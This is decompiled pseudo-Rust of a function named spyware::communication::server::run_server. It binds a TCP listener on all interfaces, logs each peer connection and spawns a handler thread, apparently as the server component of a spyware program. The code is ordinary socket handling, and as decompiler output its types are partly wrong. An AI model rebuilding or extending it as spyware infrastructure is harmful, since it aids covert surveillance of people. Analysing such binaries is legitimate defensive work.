fn spyware::communication::server::run_server(a0: u16) -> long long {
    let v0: u32;  // [bp-0x114]
    let v1: struct4;  // [bp-0x110]
    let v2: u64;  // [bp-0x10a]
    let v3: core::result::Result<core::net::socket_addr::SocketAddr, std::io::error::Error>;  // [bp-0x108], Other Possible Types: struct32, struct40, u64
    let v4: core::fmt::Arguments;  // [bp-0x100], Other Possible Types: u64
    let v5: core::fmt::Arguments;  // [bp-0x100], Other Possible Types: u64
    let v6: u64;  // [bp-0x100]
    let v7: u64;  // [bp-0x100]
    let v8: i64;  // [bp-0xf8]
    let v9: i64;  // [bp-0xf8]
    let v10: i64;  // [bp-0xf8]
    let v11: i64;  // [bp-0xf8]
    let v12: u64;  // [bp-0xf0]
    let v13: std::io::error::Error;  // [bp-0xe0], Other Possible Types: struct_0 *
    let v14: void*;  // [bp-0xd8], Other Possible Types: u64
    let v17: u64;  // [bp-0xd8]
    let v18: u64;  // [bp-0xd8]
    let v19: u64;  // [bp-0xd8]
    let v20: u64;  // [bp-0xd8]
    let v21: struct4;  // [bp-0xd4]
    let v22: u64;  // [bp-0xd0]
    let v23: i64;  // [bp-0xc8], Other Possible Types: u64
    let v24: u64;  // [sp-0xc0]
    let v25: void*;  // [bp-0xb8]
    let v26: u8;  // [bp-0xb0]
    let v27: i64;  // [bp-0xa8], Other Possible Types: struct_1 *
    let v29: u64;  // [bp-0xa0]
    let v30: i64;  // [bp-0x98], Other Possible Types: u64
    let v31: i64;  // [bp-0x98]
    let v32: u32;  // [bp-0x96]
    let v33: u16;  // [bp-0x92]
    let v34: u64;  // [bp-0x90]
    let v35: u128;  // [sp-0x88]
    let v36: core::result::Result<core::net::socket_addr::SocketAddr, std::io::error::Error>;  // [bp-0x78], Other Possible Types: struct_0 *, u64
    let v37: std::io::error::Error;  // [bp-0x70], Other Possible Types: u64
    let v38: u128;  // [bp-0x68]
    let v39: u128;  // [bp-0x58]
    let v40: alloc::string::String;  // [bp-0x48]
    let v42: u64;  // rdx
    let v43: u64;  // rcx
    let v44: u64;  // r8
    let v49: u32;  // [bp-0x106]
    let v50: u16;  // [bp-0x102]
    let v51: u32;  // [bp-0xa4]

    v2 = a0;
    *(&v3 as &&str) = "0.0.0.0";
    v6 = <&T as core::fmt::Display>::fmt;
    v10 = &v2;
    v12 = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;
    v14 = &g_4b8ca0;
    v22 = 2;
    v25 = 0;
    v23 = &v3;
    v24 = 2;
    v40 = core::option::Option<T>::map_or_else(&v14, v42, v43, v44);
    v18 = std::net::tcp::TcpListener::bind(&v40);
    match v18 as u128 {
        Err(_) => {
            return 2;
        },
        Ok(v1) => {
            v36 = std::net::udp::UdpSocket::local_addr(&v1);
            match v36 {
                Err(v13) => {
                    v4 = v6;
                    v8 = v10;
                    if core::sync::atomic::atomic_load() {
                        *(&v27 as &&std::io::error::Error) = &v13;
                        *(&v30 as &&u8) = &v27 as u8;
                        v34 = <&T as core::fmt::Display>::fmt;
                        *(&v17 as &&str) = "Error ";
                        v22 = 2;
                        v25 = 0;
                        v23 = &v30 as u8;
                        v24 = 1;
                        v3 = struct40 {
                            field_0: "spyware::communication::server"
                            field_16: "spyware::communication::server"
                            field_32: log::__private_api::loc("src/communication/server.rs")
                        };
                        log::__private_api::log(&v18 as u128, 1, &v3);
                        v4 = v5;
                        v8 = v9;
                    }
                },
                Ok(_) => {
                    v35 = v38;
                    *(&v30 as &i128) = v36 as i128;
                    v4 = v6;
                    v8 = v10;
                    if core::sync::atomic::atomic_load() >= 3 {
                        *(&v27 as &&u8) = &v30 as u8;
                        v29 = <core::net::socket_addr::SocketAddr as core::fmt::Debug>::fmt;
                        *(&v18 as &&str) = "Listening on: ";
                        v22 = 1;
                        v25 = 0;
                        v23 = &v27 as u8;
                        v24 = 1;
                        v3 = struct40 {
                            field_0: "spyware::communication::server"
                            field_16: "spyware::communication::server"
                            field_32: log::__private_api::loc("src/communication/server.rs")
                        };
                        log::__private_api::log(&v18 as u128, 3, &v3);
                        v4 = v5;
                        v8 = v9;
                    }
                },
            }
            v13 = &v1;
            loop {
                <std::net::tcp::Incoming as core::iter::traits::iterator::Iterator>::next(&v13);
                if !v27 as i32 {
                    v0 = v51;
                    v5 = v4;
                    v9 = v8;
                    if core::sync::atomic::atomic_load() >= 3 {
                        v3 = std::net::tcp::TcpStream::peer_addr(&v0);
                        match v3 {
                            Err(_) => {
                                return v4;
                            },
                            Ok(_) => {
                                v33 = v50;
                                v32 = v49;
                                v39 = *((&v3 as &char + 16) as &i128);
                                v30 = v3 as i16;
                                v34 = v4;
                                v35 = *((&v3 as &char + 16) as &i128);
                                v36 = &v30;
                                v37 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
                                *(&v20 as &&str) = "New connection with: ";
                                v22 = 1;
                                v25 = 0;
                                v23 = &v36;
                                v24 = 1;
                                v3 = struct40 {
                                    field_0: "spyware::communication::server"
                                    field_16: "spyware::communication::server"
                                    field_32: log::__private_api::loc("src/communication/server.rs")
                                };
                                log::__private_api::log(&v20 as u256, 3, &v3);
                                v5 = v7;
                                v9 = v11;
                            },
                        }
                    }
                    v8 = v9;
                    v4 = v5;
                    v23 = 0x8000000000000000;
                    v14 = 0 as void*;
                    v26 = 0;
                    v3 = std::thread::Builder::spawn_unchecked(&v20 as u256, v0 as u64);
                    v20 as u256 = core::result::Result<T,E>::expect(&v3);
                } else if v27 as i32 == 1 {
                    v36 = v29;
                    v5 = v4;
                    v9 = v8;
                    if core::sync::atomic::atomic_load() {
                        *(&v31 as &&u64) = &v36;
                        v34 = <std::io::error::Error as core::fmt::Display>::fmt;
                        *(&v19 as &&str) = "Connection failed: ";
                        v22 = 1;
                        v25 = 0;
                        v23 = &v30;
                        v24 = 1;
                        v3 = struct40 {
                            field_0: "spyware::communication::server"
                            field_16: "spyware::communication::server"
                            field_32: log::__private_api::loc("src/communication/server.rs")
                        };
                        log::__private_api::log(&v20 as u256, 1, &v3);
                        v5 = v7;
                        v9 = v11;
                    }
                    v8 = v9;
                    v4 = v5;
                } else {
                    std::panicking::begin_panic("Server closed unexpectedly"); /* do not return */
                }
            }
        },
    }
}
